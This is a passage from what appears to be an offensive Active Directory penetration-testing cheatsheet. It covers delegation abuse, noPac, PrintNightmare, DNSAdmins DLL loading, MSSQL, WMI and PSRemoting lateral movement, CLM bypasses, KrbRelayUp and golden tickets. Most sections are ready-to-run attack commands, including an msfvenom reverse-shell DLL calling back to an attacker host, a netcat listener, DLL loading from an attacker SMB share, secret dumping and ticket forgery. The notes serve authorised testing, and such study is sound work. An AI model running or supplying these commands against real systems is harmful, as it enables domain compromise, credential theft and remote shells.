Rubeus.exe asktgt /user:<target user> [/password:<password>|/rc4:<rc4 hash>|/aes128:<aes128 hash>|/aes256:<aes256 hash>|/des:<des hash>] /domain:<target domain> /outfile:<output directory>
~~~

Request TGS for an allowed service with s4u Kerberos' extension protocol with the previous TGT and perform a pass-the-ticket attack:

~~~shell
# Kekeo
tgs::s4u /tgt:<kirbi ticket file path> /user:<target user> /service:<target SPN>

# Rubeus
Rubeus.exe s4u /ticket:<base64 tgt|kirbi ticket file path> /impersonateuser:administrator /domain:<target domain> /msdsspn:<target SPN> /dc:<target DC> /ptt [/altservice:<other spns>]
~~~

Request TGT for service user and execute S4U2Self followed by a S4U2Proxy to impersonate `Administrator` with Impacket's `getST`:

~~~shell
impacket-getST -spn <target SPN> -impersonate Administrator <domain>/<username>:<password> [-force-forwardable] [-altservice <other spns>]
~~~

**Note**: `-force-forwardable` tries to force the TGS from S4USelf to be forwardable; it works if the target is vulnerable to Bronze-bit (CVE-2020-17049).

**Note**: since the SPN part is not encrypted in the request, it's possible to change it with the `/altservice` (Rubeus) and `-altservice` (Impacket's getST) flags.

#### Resource-Based Constrained Delegation (RBCD)

Resource-Based Constrained Delegation (RBCD) was introduced with Windows Server 2012 R2; it adds more flexibility and granular control on the permission delegation by mean of the `msDS-AllowedToActOnBehalfOfOtherIdentity`.

- Differently from Constrained Delegation's `msDS-AllowedToDelegateTo`, which is set on the **delegating service account**, the `msDS-AllowedToActOnBehalfOfOtherIdentity` **is set on the target service**.
- `msDS-AllowedToActOnBehalfOfOtherIdentity` it's a security descriptor that controls which front-end service can use **S4U2Proxy** to request tickets for users to access the target service.
- Unlike traditional **Constrained Delegation**, this does not require Domain Admin rights—it **can be modified by the owner of the target service**.
- If `msDS-AllowedToActOnBehalfOfOtherIdentity` is set on a **computer account**, delegation is allowed to any service running on that machine. If it is set on a **service account**, only that specific service can receive the delegated authentication.

**The attack**: Since no Domain Admins privileges are required, when a user has `GenericWrite` or `WriteAccountRestrictions` permissions (or is the owner) of a target service/machine account, it’s possible to modify its `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute so that it contains another attacker controlled computer object.

Attacking a **machine account**:

1. An attacker compromises a domain user with enough privileges for the target host.
2. The attacker creates his own machine account (or compromises an existing one). When doing this, consider the `msDS-MachineAccountQuota` on the domain object; this defines the max number of machine account that is possible to add to a domain.
3. The attacker modifies the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the targeted machine account, adding his newly created machine account.
4. The attacker performs `S4U2Self` as the controlled machine account
5. The attacker performs `S4U2Proxy` to the target service.
6. The attacker uses the TGS to authenticate against the target host as Administrator.

**Note**: RBCD works **across domain trusts**!

After patching **CVE-2020-17049** and **CVE-2020-16996**, members of Protected Users group are not vulnerable to delegation even though the "sensitive and cannot be delegated" flag is disabled. However, the native `Administrator` account (RID 500) **doesn't benefit from that restriction**, even if it's added to the Protected Users group!
Moreover, this allows to perform pass-the-hash attacks for user `Administrator` even though this is not possible for other Protected Users members.

Enumerate machine quota:

~~~powershell
# PowerView
Get-DomainObject -Identity "DC=<domain_component>,DC=<domain_component>?>" -Domain <target domain> -DomainController <target dc> | select ms-ds-machineaccountquota

# AD Module
Get-ADDomain | Select-Object -ExpandProperty DistinguishedName | Get-ADObject -Properties 'ms-DS-MachineAccountQuota' 
~~~

Enumerate machine quota remotely with `NetExec`:

~~~shell
nxc ldap <target dc> -d <target domain> -u <username> -p <password> -M maq
~~~

Enumerate workstations' `msDS-AllowedToActOnBehalfOfOtherIdentity`:

~~~powershell
# PowerView
Get-NetComputer | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity* | Where -Property msds-allowedtoactonbehalfofotheridentity -NE -Value $null

# AD Module
Get-ADComputer -Properties PrincipalsAllowedToDelegateToAccount -Filter *
~~~

Enumerate workstations' `msDS-AllowedToActOnBehalfOfOtherIdentity` remotely with Impacket's `rbcd`:

~~~shell
rbcd.py -delegate-to '<target machine account>$' -dc-ip '<dc ip>' -action 'read' '<domain>'/'<username>':'<password>'
~~~

Add a new machine account to the domain:

~~~powershell
# AD Module
$Password = ConvertTo-SecureString "<password>" -AsPlainText -Force
New-ADComputer -Name "<name>" -SamAccountName "<name>$" -Path "CN=Computers, DC=<domain_component>,DC=<domain_component>?>'" -UserPrincipalName "<sam account name>$@<domain>" -Enabled $true  -AccountPassword $Password
~~~

Add a new machine account to the domain remotely with Impacket's `addcomputer`:

~~~shell
impacket-addcomputer -computer-name '<name>$' -computer-pass '<password>' -dc-host <target dc> '<domain>/<username>:<password>'
~~~

Add controlled machine account to target's `msDS-AllowedToActOnBehalfOfOtherIdentity`. Requires a user with enough privileges:

~~~powershell
# AD Module
Set-ADComputer <target computer> -PrincipalsAllowedToDelegateToAccount '<controlled machine account>$'
~~~

Add controlled machine account to target's `msDS-AllowedToActOnBehalfOfOtherIdentity` remotely with Impacket's `rbcd`. Requires a user with enough privileges:

~~~shell
rbcd.py -delegate-from '<controlled machine account>$' -delegate-to '<target machine account>$' -dc-ip '<dc ip>' -action 'write' '<domain>'/'<username>':'<password>'
~~~

Create a machine account and add it to `msDS-AllowedToActOnBehalfOfOtherIdentity` using relayed credentials with Impacket's `ntlmrelayx`:

~~~shell
ntlmrelayx -t ldaps://<target dc> -smb2support --add-computer <computer name> --delegate-access
~~~

Request a Service Ticket with the controlled machine account on behalf of Administrator for the target machine with `Rubeus`:

~~~shell
# First request a TGT
Rubeus.exe asktgt /user:"<controlled machine account>$" /password:<password> /nowrap

# Use TGT to obtain a forwardable TGS
Rubeus.exe s4u /nowrap /impersonateuser:"administrator" /msdsspn:"host/<target host>" /altservice:cifs,ldap /domain:"<domain>" /user:"<controlled machine account>$" /ticket:<ticket from previous command>
~~~

Request a Service Ticket with the controlled machine account on behalf of Administrator for the target machine remotely with Impacket's `getST`:

~~~shell
getST.py -spn 'cifs/<target host>' -impersonate Administrator -dc-ip '<dc ip>' '<domain>/<controlled machine account>$:<password>'
~~~

Use the resulting ticket in a [[active-directory-cheatsheet#Pass-the-* attacks|Pass-the-Ticket]] attack.

Cleanup:

~~~powershell
# AD Module
Set-ADComputer <target machine> -PrincipalsAllowedToDelegateToAccount $Null 
Remove-ADComputer -Identity '<controlled machine DN>'
~~~

Cleanup with Impacket's `rbcd` and `addcomputer`:

~~~shell
impacket-rbcd -delegate-from '<controlled machine account>$' -delegate-to '<target machine account>$' -dc-ip '<dc ip>' -action 'flush' '<domain>'/'<username>':'<password>'

impacket-addcomputer -computer-name '<name>$' -computer-pass '<password>' -dc-host <target dc> '<domain>/<username>:<password>' -delete
~~~

#### Mitigations

- Limit Domain Admin and Administrator logins to non DC servers or to specific servers.
- Set the `Account is sensitive and cannot be delegated` attribute for privileged accounts.

### sAMAccountName (nopac)

This attack is possible when the following CVEs are present:

- **CVE-2021-42278 - Name impersonation**: No validation process exists for computer accounts name to have a trailing `$`.
- **CVE-2021-42287 - KDC bamboozling**: When requesting a service ticket with a TGT, the KDC will search for the user's `sAMAccountName` requesting the ticket. If this is not found, a `$` is appended to the username and searched again. 


~~~quote
# https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing
What happens is that if a TGT is obtained for bob, and the bob user gets removed, using that TGT to request a service ticket for another user to himself (S4U2self) will result in the KDC looking for bob$ in AD. If the domain controller account bob$ exists, then bob (the user) just obtained a service ticket for bob$ (the domain controller account) as any other user 🤯.
~~~

This attack can be conducted in two ways:

- Abusing a Machine Account
- Abusing a User Account

#### sAMAaccountName Spoofing - Abusing a Machine Account

The attack is the following:

1. Create a machine account (taking in account the machine quota of the DC).
2. Since the creator of a machine account has full control on it, remove any SPN that refers it actual name from the `servicePrincipalName` field.
3. Change the machine account name to that of a Domain Controller without the trailing `$` (CVE-2021-42278).
4. Request a TGT.
5. Restore the original account name.
6. Request a TGS on behalf of a domain admin using the previously obtained TGT with S4U2self. The KDC will perform S4U2self as if the requesting user is the domain controller account.
7. Use the TGS.

#### sAMAaccountName Spoofing - Abusing a User Account

The attack is the same as for Machine Account but at least a `WriteProperty` permission is required on the controlled user's `sAMAaccountName` in order to edit its value. Moreover, the user account password or hash is necessary to obtain the TGT.

Check if DC is vulnerable to CVE-2021-42278 and CVE-2021-42287 and its machine quota:

~~~shell
nxc smb <target DC> -u '<username>' -p '<password>' -M nopac
nxc smb <target DC> -u '<username>' -p '<password>' -M maq
~~~

Add computer to the DC with Impacket's `addcomputer`:

~~~shell
impacket-addcomputer -computer-name '<new computer name>$' -computer-pass '<password>' -dc-host <DC hostname> -domain-netbios <DC netbios> '<domain>/<username>:<password>'
~~~

Cleanup computer object's SPNs (shouldn't be necessary when creating the computer with impacket's `addcomputer`) with [addspn](https://github.com/dirkjanm/krbrelayx):

~~~shell
python3 addspn.py --clear -t '<new computer name>$' -u '<domain>\<username>' -p '<password>' '<DC IP/hostname>'
~~~

Rename the machine using [renameMachine.py](https://github.com/fortra/impacket/blob/b4fbcf9196e9b6098edae0ae7794005d2e138ccd/examples/renameMachine.py):

~~~shell
python3 renameMachine.py -current-name '<new computer name>$' -new-name '<target DC name without $>' -dc-ip '<DC ip>' '<domain>'/'<username>':'<password>' 
~~~

Request TGT for the renamed machine with Impacket's `getTGT`:

~~~shell
impacket-getTGT -dc-ip '<DC ip>' '<domain>'/'<renamed computer name>':'<password>'
~~~

Restore the new machine name using `renameMachine` or delete it with Impacket's `addcomputer`.

Use received TGT to request a TGS to the KDC:

~~~shell
export KRB5CCNAME=<target DC name without $>.ccache
impacket-getST -self -impersonate 'Administrator' -altservice 'cifs/<domain FQDN>' -k -no-pass -dc-ip '<DC ip>' '<domain>'/'<target DC name without $>'
~~~

Use then the received TGS to authenticate as Domain Administrator.

Perform the whole attack automatically with [noPac]():

~~~shell
# Request TGS
python3 noPac.py <domain>/<username>:<password> -dc-ip <DC ip> --impersonate Administrator

# Dump Secrets
python3 noPac.py <domain>/<username>:<password> -dc-ip <DC ip> --impersonate Administrator -dump

# Open shell
python3 noPac.py <domain>/<username>:<password> -dc-ip <DC ip> --impersonate Administrator -shell
~~~

**Note**: remember to delete created machine account with administrative privileges if used user has not enough permissions.

### PrintNightmare (CVE-2021-34527)

This vulnerability allows to achieve **RCE** when remote connection is allowed or at least **local privilege escalation** otherwise.

Vulnerable functions are functions `RpcAddPrinterDriverEx` and `RpcAddPrinterDriver` that allow remote driver installation by users.

The attack (from [TheHackerRecipes](https://www.thehacker.recipes/ad/movement/print-spooler-service/printnightmare)):

1. A mischievious driver (a DLL file) is hosted on a SMB share.
2. The client creates a [`DRIVER_INFO_2`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/39bbfc30-8768-4cd4-9930-434857e2c2a2) object containing the path to the attacker's DLL and passes it into the DRIVER_CONTAINER object.
3. The client calls [`RpcAddPrinterDriverEx`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/b96cc497-59e5-4510-ab04-5484993b259b) with the `DRIVER_CONTAINER` to load the attacker's DLL into the server's dynamic library and with multiple bit values within the `dwFileCopyFlags` in order to bypass the `SeLoadDriverPrivilege` privilege verification by the server.
4. The attacker's DLL is executed on the server within `SYSTEM` context.

Check if RPC pipes are enabled with Impacket's `rpcdump`:

~~~shell
impacket-rpcdump @<target> | grep -e 'MS-RPRN|MS-PAR'
~~~

Check if target is vulnerable with [PrintNightmare](https://github.com/ly4k/PrintNightmare):

~~~shell
printnightmare.py -check '<user>:<password>@<target>'
~~~

Check if target is vulnerable with `NetExec`:

~~~shell
nxc smb <target> -user <user> -p <password> -M printnightmare
~~~

Generate a reverse shell DLL with `msfvenom` (easily blocked by AV - better use a custom payload - see [[active-directory-cheatsheet#DLLs|Misc - DLLs]]):

~~~shell
msfvenom -f dll -p windows/x64/shell_reverse_tcp LHOST=<attacker ip> LPORT=<attacker port> -o <output path>
~~~

Start a SMB server with Impacket's `smbserver`:

~~~shell
smbserver.py -smb2support "<share name>" <share path>
~~~

Start the reverse shell listener:

~~~shell
nc -lvnp <listening port>
~~~

Run `PrintNightmare` exploit:

~~~shell
# Remote DLL
printnightmare.py -dll '\\<attacker smb server>\<share name>\<dll name>' '<user>:<password>@<target>' [-name '<Custom driver name>']

# Local DLL
printnightmare.py -dll '<dll path>' '<user>:<password>@<target>' [-name '<Custom driver name>']
~~~

List current printer drivers with `PrintNightmare`:

~~~shell
printnightmare.py -list '<user>:<password>@<target>'
~~~

Delete printer driver with `PrintNightmare`:

~~~shell
printnightmare.py -delete -name '<driver name>' '<user>:<password>@<target>'
~~~

Take also a look to:

- [SharpPrintNightmare](https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare/SharpPrintNightmare)

### DNSAdmins

Users member of the DNSAdmins group are allowed to load arbitrary DLL plugins for the DNS server. This DLL gets loaded by the `dns.exe` process; this process is the DNS server service (generally running on a DC) and runs with **SYSTEM** level privileges.

- The loaded DLL will run with the same level of privileges!
- The value for `ServerLevelPluginDll` at registry `HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters` will contain the path to the DLL.

By performing a DLL injection attack, it could be possible to escalate privileges to Domain Admin when the DC serves as DNS.

Note: in order to restart the DNS service, the DNSAdmins group must have the privileges to restart the DNS service; by default, this group **CANNOT** restart DNS service.

References:

- [https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83)

Enumerate the members of the DNSAdmins group:

~~~powershell
# PowerView
Get-NetGroupMember -GroupName "DNSAdmins"

# AD Module
Get-ADGroupMember -Identity DNSAdmins
~~~

Load the DLL to the target DNS service - **requires RSAT with DNS Server Tools installed**:

~~~powershell
dnscmd <target server> /config /serverlevelplugindll \\<attacker controlled smb share>\<path to dll>

# Or, alternatively
$dnsettings = Get-DnsServerSetting -ComputerName <target server> -Verbose -All
$dnsettings.ServerLevelPluginDll = "\\<attacker controlled smb share>\<path to dll>"
Set-DnsServerSetting -InputObject $dnsettings -ComputerName <target server> -Verbose
~~~

Note: `<target server>` generally is the DC.

Stop and restart the DNS service (compromised user must have enough privileges):

~~~shell
sc \\<target server> stop dns
sc \\<target server> start dns
~~~

Here can be found a template for the DLL: [dns-exe-persistence](https://github.com/dim0x69/dns-exe-persistance).

- Edit the function `DnsPluginInitialize` in the file `Win32Project1.cpp`
- In order to not crash the DNS server, **run any reverse shell in a separate thread**!

~~~c++
DNS_PLUGIN_API int DnsPluginInitialize(PVOID a1, PVOID a2) {
	HANDLE h;
	DWORD threadId;
	h = CreateThread(0, 0, RevShellFunction, 0, 0, &threadId);
	return 0;
}
~~~

### MSSQL Server

In Microsoft SQL server it's important to distinguish a **login** from a **user**:

- A **login** is at the **server level** and is used to authenticate a user to SQL Server. It verifies who the user is (**Authentication**). It exists at the **SQL Server instance level**.
- A **user** is at the **database level** and is associated with a login. It defines what a user can do inside a specific database **(Authorization)**. Exists within a **particular database**.

In Microsoft SQL Server, **impersonation** is a security feature that allows one user or process to **execute statements as if they were another user**.

- This is typically done using the `EXECUTE AS` statement, when impersonation is active.

Impersonation can happen in two different contexts:

- **EXECUTE AS USER**: Impersonates a **database user**.
- **EXECUTE AS LOGIN**: Impersonates a **server-level login**.

An attacker could abuse misconfigurations on impersonation permissions to escalate privileges on the DB and potentially achieving command execution.

- The impact of this security issue is aggravated if its also possible to abuse [[active-directory-cheatsheet#MSSQL Database Links|MSSQL Database Links]], moving laterally to other domains.

Connect to a SQL server with Impacket's `mssqlclient`:

~~~shell
impacket-mssqlclient <domain>/<user>:<password>@<target host> -windows-auth
~~~

`mssqlclient` commands:

~~~mssqlclient
lcd {path}                 - changes the current local directory to {path}  
   exit                       - terminates the server process (and this session)  
   enable_xp_cmdshell         - you know what it means  
   disable_xp_cmdshell        - you know what it means  
   enum_db                    - enum databases  
   enum_links                 - enum linked servers  
   enum_impersonate           - check logins that can be impersonated  
   enum_logins                - enum login users  
   enum_users                 - enum current db users  
   enum_owner                 - enum db owner  
   exec_as_user {user}        - impersonate with execute as user  
   exec_as_login {login}      - impersonate with execute as login  
   xp_cmdshell {cmd}          - executes cmd using xp_cmdshell  
   xp_dirtree {path}          - executes xp_dirtree on the path  
   sp_start_job {cmd}         - executes cmd using the sql server agent (blind)  
   use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)  
   ! {cmd}                    - executes a local shell cmd  
   show_query                 - show query  
   mask_query                 - mask query
~~~

Connect to a SQL Server with `NetExec`:

~~~shell
nxc mssql <target> -u <user> -p <password>
~~~

Execute a query  with `NetExec`:

~~~shell
nxc mssql <target> -u <user> -p <password> --query <query>
~~~

Execute a shell command  with `NetExec` (`xp_cmdshell` privileges required):

~~~shell
nxc mssql <target> -u <user> -p <password> --query <query>
~~~

Enumerate impersonate privileges with `NetExec`:

~~~shell
nxc mssql <target> -u <user> -p <password> -M mssql_priv
~~~

List more module available for users with admin privileges on the DB with `NetExec`:

~~~shell
nxc mssql <target> -u <user> -p <password> -L
~~~

### Windows Management Instrumentation (WMI)

Windows Management Instrumentation (WMI) is a powerful framework provided by Microsoft for managing and accessing data about a wide range of Windows operating system components. It enables developers, administrators, and scripts to interact with the underlying system in a standardized way, allowing them to monitor, configure, and query system information efficiently.

-  **System Management**: WMI can query hardware and software configurations, manage system processes, and retrieve performance data.
- **Scripting Support**: Administrators can use WMI in scripting languages such as PowerShell, VBScript, or Python to automate tasks.
-  **Standardized Interface**: It uses a unified object model and supports various protocols, making it a consistent tool for management tasks.
- **Extensibility**: Developers can extend WMI by creating custom providers to expose additional data or manage new resources.

WMI uses a repository of classes that describe different system resources. These classes are organized into namespaces (e.g., `root\CIMv2`). Some common classes include:

- `Win32_OperatingSystem`: Provides information about the OS.
- `Win32_Process`: Manages and queries running processes.
- `Win32_Service`: Interacts with system services.

A WMI session can be established using one of the following protocols:

- **DCOM**: RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP (DCERPC).
- **Wsman**: WinRM will be used for connecting to WMI. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).

WMI can be used by an attacker to perform lateral movement by executing commands, creating services or scheduled tasks on remote targets.

Run remote process (from cmd):

~~~shell
wmic.exe /user:<username> /password:<password> /node:<target computer> process call create "<command>" 
~~~



Create a `PSCredential` object with the credentials of a compromised user to be used to create a persistent WMI session:

~~~powershell
$sPassword = ConvertTo-SecureString <password> -AsPlainText -Force;
$psCredential = New-Object System.Management.Automation.PSCredential <username>, $sPassword;
~~~

Create a persistent WMI session to be used to run command on the remote target or create services:

~~~powershell
# Set the session options like the protocol to be used
$SessionOptions = New-CimSessionOption -Protocol DCOM
# Create the session
$Session = New-Cimsession -ComputerName <target computer> -Credential $psCredential -SessionOption $SessionOptions -ErrorAction Stop
~~~

Run remote process:

~~~powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "<command>" }
~~~

Create service to a remote target:

~~~powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{ Name = "<service name>"; DisplayName = "<service full name>"; PathName = "<command>"; ServiceType = [byte]::Parse("16"); StartMode = "<start mode>" }
~~~

where:

- `StartMode`: can be one of those specified [here](https://learn.microsoft.com/en-us/dotnet/api/system.serviceprocess.servicestartmode?view=net-9.0-pp) 
- `ServiceType`: can be one of those specified [here](https://learn.microsoft.com/en-us/dotnet/api/system.serviceprocess.servicetype?view=net-9.0-pp); value `16` corresponds to service type `Win32OwnProcess` which indicates that the service will run in a new process.

Manage the service (start, stop and delete):

~~~powershell
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE '<service name>'"

# Start Service
Invoke-CimMethod -InputObject $Service -MethodName StartService

# Stop Service
Invoke-CimMethod -InputObject $Service -MethodName StopService

# Delete Service
Invoke-CimMethod -InputObject $Service -MethodName Delete
~~~

Create a scheduled task to remote target:

~~~powershell
# Create task action object
$actionObj = New-ScheduledTaskAction -CimSession $Session -Execute <command without arguments> -Argument <command arguments>

# Create scheduled task
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "<task name>"

# Start Scheduled task
Start-ScheduledTask -CimSession $Session -TaskName "<task name>"

# Remove scheduled task
Unregister-ScheduledTask -CimSession $Session -TaskName "<task name>"
~~~

Install MSI package on remote target (requires Local Administrator privileges):

~~~powershell
# Using powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "<package location>"; Options = ""; AllUsers = $false}

# or with old wmic
wmic.exe /node:<target computer> /user:<domain\user> product call install PackageLocation=<package location>
~~~

### PowerShell Remoting

Enabled by default on Windows Server 2012 onwards.

- If not, it can be enabled with `Enable-PSRemoting`. This operation requires local Administrator privileges.

Generally, it requires Administrator privileges on the target machine\* :

- The shell will have elevated privileges.

\*Note: Administrator privileges are required only on the target machine, not on the machine where the commands are being executed.
 
 By default, PSRemoting listeners run on default ports:
 
  - 5985 for http
  - 5986 for https

A PSRemoting session runs in a new `wsmprovhost` process.

There are two different kinds of PSRemoting:

- **One-to-One**: Consists into interactively logging to another computer - (using `New-PSSession` or `Enter-PSSession`).
- **One-to-Many**: Consists into executing parallel commands or scripts on multiple machines - (using `Invoke-Command`).

The one-to-many approach allows to run commands and scripts on:

-  multiple remote computers,
- on disconnected sessions (v3)
- as background job and more.

When using an "attacking" Windows machine that is **NOT** joined to the target domain, it's necessary to add the target host to WinRM's `TrustedHosts`:

~~~powershell
# Add All
Set-Item WSMan:localhost\client\trustedhosts -value *
# Add All from specific domain
Set-Item WSMan:\localhost\Client\TrustedHosts *.yourdomain.local
# Add specific host
Set-Item WSMan:\localhost\Client\TrustedHosts host.yourdomain.local -Concatenate
~~~

Check if target has PowerShell Remoting enabled:

~~~powershell
[bool](Test-WSMan -ComputerName '<computer name>' -ErrorAction SilentlyContinue)
~~~

Open a remote interactive session (one-to-one approach):

~~~Powershell
# Stateless Session
Enter-PSSession -Computer <target computer>

winrs.exe -u:<username> -p:<password> -r:<target computer> cmd

## Using credentials in memory
winrs.exe -r:<target computer> cmd

# Stateful Session
## Create a remote session
$securePassword = ConvertTo-SecureString <password> -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential <username>, $sPassword;
$sess = New-PSSession -ComputerName <target computer> -Credential $credential

##  Load script functions to the remote Session target
Invoke-Command -FilePath <script path> -Session $sess

## Execute commands on the remote session
Invoke-Command -ScriptBloack {<commands>} -Session $sess

## Interactively access the remote session
Enter-PSSession -Session $sess
~~~

Run command/scripts on multiple targets (one-to-many approach):

~~~powershell
# Execute commands or scriptblocks
Invoke-Command -Scriptblock {<commands>} -ComputerName <list_of_servers> # Use (Get-Content <file with list of servers>) in order to get the list from a file
# Execute locally loaded function
Invoke-Command -Scriptblock {function:<function name>} -ComputerName <list_of_servers>

# Execute scripts from files
Invoke-Command -FilePath <Script path> -ComputerName <list_of_servers>
~~~

\*Note: when running commands/scripts with `Invoke-Command` it could happen that the target as the `LanguageMode` set to `ConstrainedLanguage`:

- If that's the case, then various functionalities will be blocked - see [there](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/). Only core *cmdlets* will be available.

Install dependencies on Linux:

~~~shell
sudo pwsh -Command 'Install-Module -Name PSWSMan'
sudo pwsh -Command 'Install-WSMan'
sudo apt install gss-ntlmssp
~~~


If receiving the following error when running `Enter-PSSession` or similar:

~~~quote
The WinRM client  cannot process the request. If the authentication scheme is different from Kerberos, or if the client computer is not   joined to a domain, then HTTPS transport must be used or the destination machine must be added to the TrustedHosts      configuration setting. Use winrm.cmd to configure TrustedHosts. Note that computers in the TrustedHosts list might not  be authenticated. You can get more information about that by running the following command: winrm help config. For      more information, see the about_Remote_Troubleshooting Help topic. 
~~~

Add the the target host to the TrustedHosts as follows:

~~~powershell
Enable-PSRemoting -SkipNetworkProfileCheck
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "<target host>" -Concatenate
~~~

Useful Resources:

- [PSRemoting - Linux to Windows](https://thomask.sdf.org/blog/2019/12/15/linux-windows-powershell-remoting-troubleshooting.html)
- [PowerShell Constrained Language Mode](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)

#### Constrained Language Mode Bypasses

**Constrained Language Mode** is enabled by setting the `__PSLockdownPolicy` environment variable to the value `4`.

- Having access to the system with enough privileges to change environment variables allow to bypass the **Constrained Language Mode** by removing the `__PSLockdownPolicy` variable.
- If it's possible to downgrade to PowerShell 2.0, it's possible to bypass the **Constrained Language Mode** by opening a downgraded PowerShell session: `powershell -version 2`
- If the script to run filename or the path where it's located contains the string `system32`, it will run in **Full Language Mode**.

\*Note: Constrained Language Mode will also block tools such as mimikatz.

Useful resources:

- [Constrained Language Mode Bypass When \_\_PSLockDownPolicy Is Used](https://www.blackhillsinfosec.com/constrained-language-mode-bypass-when-pslockdownpolicy-is-used/)
### Defense

- Prevent or limit login for Domain Admins to any other machine other than the Domain Controllers.
- Never run a service with Domain Admin privileges when it's strictly unnecessary. Prefer a service account with privileges limited in respect of **least privilege principle**.
- Use Temporary Group Membership when it's necessary to temporarily add a user to a group with higher privileges; this feature allows to define a time span in which the membership is held for the user. 
	- This helps prevent forgetting to remove the user when it's no more necessary for it to be part of the higher privileges group.
	- `Add-ADGroupMember -Identity <group> -Members <user> -MemberTimeToLive (New-TimeSpan -Minutes 20)`

## Post Exploitation & Persistence

### Local Privilege Escalation

Refer also to [[windows-privilege-escalation|Windows Privilege Escalation]].

#### KrbRelayUp

[KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp) is a tool that implements a universal no-fix local privilege escalation abusing Kerberos relays to gain a SYSTEM shell.

This tools supports three variant:

- RBCD-based
- Shadow Credentials-based
- ADCS Web Enrollment-based


For the **RBCD-based** variant prerequisites are:

- LDAP signing not required on Domain Controller (default!)
- Ability for the current domain user to add computers to the domain (ms-DS-MachineAccountQuota = 10 by default!) or an owned computer account

This technique can be replicated manually following this guide: [KrbRelay with RBCD Privilege Escalation HOWTO](https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9l)


For the **Shadow Credentials-based** prerequisites are:

- Domain Controller without LDAP Signing enforced (default)
- Domain Controller with its own server authentication certificate (for PKINIT authentication)
- Ability to write the `msDs-KeyCredentialLink` attribute of the target computer account (default)

This technique can be replicated manually following this guide: [No-Fix Local Privilege Escalation Using KrbRelay With Shadow Credentials](https://icyguider.github.io/2022/05/19/NoFix-LPE-Using-KrbRelay-With-Shadow-Credentials.html)


For the ADCS Web Enrollment-based variant prerequisites are:

- Domain Controller with its own server authentication certificate (for PKINIT authentication)
- Ability to write the `msDs-KeyCredentialLink` attribute of the target computer account (default)

**Important Note**: this tool is generally detected by AV and EDR; generally reflectively loading it generates unstable behaviour.

Tool and advanced usage can be found [here](https://github.com/Dec0ne/KrbRelayUp).

RBCD-based variant:

~~~powershell
# Relay
.\KrbRelayUp.exe relay -Domain <domain> -CreateNewComputerAccount -ComputerName <new computer name>$ -ComputerPassword <password>


# Spawn
.\KrbRelayUp.exe spawn -d <domain> -cn <new computer name>$ -cp <password>
~~~

Shadow Credentials-based variant:

~~~powershell
.\KrbRelayUp.exe full -m shadowcred --ForceShadowCred
~~~

ADCS Web Enrollment-based variant:

~~~
.\KrbRelayUp.exe full -m adcs
~~~

### Golden & Silver Tickets

Having the hash of **krbtgt** account's password, the TGT service account, it's possible to use it to forge a TGT, called **Golden Ticket**. The golden ticket then can be used to request TGS for almost all services.

- Apart from **krbtgt**'s hash, to forge a Golden ticked is needed the domain name, domain SID, and user ID for the person we want to impersonate.
- If it's possible to obtain the the **domain name**, **domain SID**, and **user ID** for the person we want to impersonate, than is highly probable that is possible to recover the other information.

The Golden ticket than can be used with the Pass-the-ticket attack.

Some considerations:

- Since step 1 (AS_REQ) and 2 (AS_REP) in Kerberos authentication flow are bypassed, there's no need to know the password hash for the user to be impersonated.
- The user presented in step 3 will be validated by the KDC only if the timestamp presented along it is older than 20 minutes. This means that it can be a disabled, deleted, or non-existent\* account, and it will be valid as long as we ensure the timestamp is not older than 20 minutes.
- Since the policies and rules for tickets are set in the TGT itself, it's possible to overwrite the values pushed by the KDC, such as the ticket validity time.
- By default, the **krbtgt** account's password never changes, unless it is manually rotated,
- When rotating **krbtgt** account's password, it must be rotated twice, since **the current and previous passwords** are kept valid for the account. This is to ensure that accidental rotation of the password does not impact services.
- Generally, until the timestamp in the TGT is still valid, when rotating **krbtgt** account's password many services would stop working since not all of them are smart enough to release the TGT and request a new one that is signed with the new password.
- Golden tickets allow to bypass smart card authentication, since the smart card is verified by the DC before it creates the TGT.
- It's possible to generate a golden ticket on any machine, even one that is not domain-joined (such as the attacker machine), making it harder for the blue team to detect.
- Forge a Golden Ticket that it's compliant to the **Kerberos Policy** for a domain can reduce the chances to be detected.

Generate a golden ticket:

~~~shell
kerberos::golden /admin:<Any user> /domain:<Domain> /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt
~~~

Where:

- **/admin** - The username to impersonate. This does not have to be a valid user.  
- **/domain** - The FQDN of the domain to generate the ticket for.  
- **/id** -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.  
- **/sid** -The SID of the domain to generate the ticket for.
- **/krbtgt** -The NTLM hash of the KRBTGT account.   
- **/endin** - The ticket lifetime. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 10 hours (600 minutes)(\*1).
- **/renewmax** -The maximum ticket lifetime with renewal. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 7 days (10080 minutes)(\*1).
